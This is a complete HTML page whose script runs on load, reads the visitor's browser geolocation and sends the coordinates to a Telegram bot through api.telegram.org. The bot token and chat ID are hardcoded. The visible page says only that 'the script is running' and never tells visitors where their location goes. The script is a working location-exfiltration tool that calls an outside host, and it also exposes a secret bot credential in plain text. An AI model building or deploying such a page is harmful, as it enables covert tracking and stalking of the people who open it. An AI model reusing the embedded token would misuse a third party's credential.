<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send GPS to Telegram</title>
    <script>
        function sendLocationToTelegram(latitude, longitude) {
            const token = '7440422756:AAH7WUactI9NrJI0J5SpRcPBXIFNDx1ZU9o';
            const chatId = '6566668050';
            const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Location sent successfully:', data.result.text);
                    } else {
                        console.error('Failed to send location:', data.description);
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        sendLocationToTelegram(latitude, longitude);
                    },
                    error => console.error('Error getting location:', error)
                );
            } else {
                console.error('Geolocation is not supported by this browser.');
            }
        }

        window.onload = getLocation;
    </script>
</head>
<body>
    <h1>Sending GPS Coordinates to Telegram Bot</h1>
    <p>If you see this message, the script is running.</p>
</body>
</html>
